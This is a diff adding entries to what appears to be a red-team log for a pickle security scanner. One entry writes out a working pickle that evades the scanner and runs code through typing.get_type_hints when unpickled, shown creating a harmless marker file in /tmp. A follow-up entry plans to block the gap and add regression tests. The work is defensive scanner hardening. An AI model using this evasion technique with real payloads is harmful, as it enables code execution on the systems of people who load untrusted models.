@@ -312,3 +312,104 @@ Blocking plan:
 
 Performance note: the fix is a single additional binary-search entry. It does
 not add generated-source parsing or broader string scanning.
+
+## Turn 11 - `typing.get_type_hints` annotation eval gap
+
+Goal: produce another self-contained code-execution pickle that
+`packages/modelaudit-picklescan` does not flag.
+
+Payload shape:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    return b"\x8c" + bytes([len(data)]) + data
+
+
+marker = Path("/tmp/ma_typing_get_type_hints_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        s("typing"),
+        s("get_type_hints"),
+        b"\x93",
+        s("builtins"),
+        s("type"),
+        b"\x93",
+        s("C"),
+        b")",
+        b"}",
+        s("__annotations__"),
+        b"}",
+        s("x"),
+        s("f(p) or int"),
+        b"s",
+        b"s",
+        b"\x87R",
+        b"}",
+        s("f"),
+        s("pathlib"),
+        s("Path.touch"),
+        b"\x93s",
+        s("p"),
+        s("pathlib"),
+        s("PosixPath"),
+        b"\x93(",
+        s("/"),
+        s("tmp"),
+        s("ma_typing_get_type_hints_marker"),
+        b"tRs",
+        s("int"),
+        s("builtins"),
+        s("int"),
+        b"\x93s",
+        b"N\x87R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Scanner result: `status=complete`, `verdict=clean`, `findings=[]`,
+  `notices=[]`
+- Unpickle result: creates `/tmp/ma_typing_get_type_hints_marker` and returns
+  `{"x": <class 'int'>}`
+- RCE mechanism: the pickle first builds
+  `type("C", (), {"__annotations__": {"x": "f(p) or int"}})` using
+  `builtins.type`, then calls
+  `typing.get_type_hints(C, {"f": pathlib.Path.touch, "p": marker, "int": int}, None)`.
+  `get_type_hints()` evaluates string annotations with the supplied globals, so
+  the bland annotation expression touches the marker during unpickling.
+
+Why the scanner missed it:
+
+- `typing.get_type_hints` is absent from `DANGEROUS_GLOBALS`, and `typing` is
+  not a wildcard-dangerous module.
+- The payload uses only currently clean globals:
+  `typing.get_type_hints`, `builtins.type`, `pathlib.Path.touch`,
+  `pathlib.PosixPath`, and `builtins.int`.
+- The evaluated annotation string is intentionally bland (`f(p) or int`) and
+  does not contain current suspicious string seeds such as `eval(`, `exec(`,
+  `__import__`, `os.system`, or `subprocess`.
+
+Performance note: this is a policy coverage gap around a public annotation eval
+sink. The narrow next block is a sorted `DANGEROUS_GLOBALS` entry for
+`("typing", "get_type_hints")`, plus a manual-pickle oracle regression that
+asserts scan-time detection before unpickle-time marker creation.
+
+## Turn 12 - Block `typing.get_type_hints`
+
+Blocking plan:
+
+- Add `("typing", "get_type_hints")` to the sorted dangerous-global table.
+- Add portable policy coverage for raw `GLOBAL typing get_type_hints`
+  reductions.
+- Add a CPython oracle regression that manually builds the annotated class and
+  supplied globals, verifies scanner detection, then verifies the marker file
+  appears only during unpickle.
+
+Performance note: the fix is a single additional binary-search entry. It does
+not add annotation parsing, source parsing, or broader string scanning.
